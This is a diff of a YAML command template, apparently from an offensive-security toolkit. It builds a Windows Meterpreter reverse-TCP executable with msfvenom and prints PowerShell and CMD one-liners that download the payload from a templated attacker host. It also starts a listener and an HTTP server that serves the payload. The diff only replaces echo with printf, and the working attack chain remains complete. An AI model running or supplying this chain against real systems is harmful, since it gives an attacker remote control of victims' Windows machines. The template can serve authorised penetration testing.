@@ -6,16 +6,17 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
+  mkdir -p packstation/outbound; \
+  printf '%s\n' 'msfvenom creates the payload. Please wait...'; \
   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
-  echo '================================================================'; \
-  echo '                      ------Listener------                      '; \
-  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Listener------                      '; \
+  printf '%s\n' 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         -----CMD-----                          '; \
+  printf '%s\n' 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
